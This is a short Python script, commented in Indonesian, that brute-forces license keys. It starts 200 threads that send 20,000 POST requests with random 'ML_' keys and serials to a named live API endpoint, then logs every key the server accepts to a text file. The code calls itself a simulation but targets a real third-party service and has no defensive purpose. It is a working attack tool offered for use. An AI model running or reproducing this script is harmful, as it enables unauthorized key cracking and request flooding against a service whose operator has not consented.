import requests
import json
import random
import string
import secrets
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

URL_TARGET = 'https://migoreng.my.id/api/v1/ml'
JUMLAH_THREAD = 200
MAKSIMAL_REQUEST = 20000
LOG_FILE = "key.txt"

# Lock untuk menulis aman dari multi-thread
file_lock = Lock()

def generate_ml_key():
    return "ML_" + "".join(secrets.choice("0123456789ABCDEF") for _ in range(12))

def log_attempt(nomor_urut, user_key, serial, status, reason=""):
    """Menyimpan percobaan ke file teks"""
    with file_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if status == "success":
                f.write(f"[SUCCESS] #{nomor_urut} | Key: {user_key} | Serial: {serial} | Reason: {reason}\n")
            else:
                f.write(f"[FAILED]  #{nomor_urut} | Key: {user_key} | Serial: {serial} | Reason: {reason}\n")

def kirim_request_bot(nomor_urut):
    user_key = generate_ml_key()
    serial = "SN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    
    payload = {
        "game": "ml",
        "user_key": user_key,
        "serial": serial,
    }
    
    try:
        response = requests.post(
            URL_TARGET,
            data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=5
        )
        
        try:
            resp_json = response.json()
        except json.JSONDecodeError:
            reason = f"Non-JSON (HTTP {response.status_code})"
            print(f"[-] #{nomor_urut} GAGAL | Key: {user_key} → {reason}")
            log_attempt(nomor_urut, user_key, serial, "failed", reason)
            return
        
        if resp_json.get("status") is True:
            reason = "Success"
            print(f"[+] #{nomor_urut} SUKSES! Key: {user_key}")
            log_attempt(nomor_urut, user_key, serial, "success", reason)
        else:
            reason = resp_json.get("reason", "No reason provided")
            print(f"[-] #{nomor_urut} GAGAL | Key: {user_key} → {reason}")
            log_attempt(nomor_urut, user_key, serial, "failed", reason)
            
    except Exception as e:
        error_msg = f"{type(e).__name__}: {e}"
        print(f"[!] #{nomor_urut} ERROR | Key: {user_key} → {error_msg}")
        log_attempt(nomor_urut, user_key, serial, "error", error_msg)

def main():
    # Kosongkan file log di awal (opsional — ganti ke mode 'a' jika ingin append terus)
    open(LOG_FILE, "w").close()
    
    print(f"[+] Memulai simulasi: {MAKSIMAL_REQUEST} request, {JUMLAH_THREAD} thread")
    print(f"[+] Log disimpan ke: {LOG_FILE}\n")
    
    with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
        list(executor.map(kirim_request_bot, range(1, MAKSIMAL_REQUEST + 1)))
    
    print(f"\n[✓] Selesai. Semua key telah dicatat di '{LOG_FILE}'.")

if __name__ == "__main__":
    main()
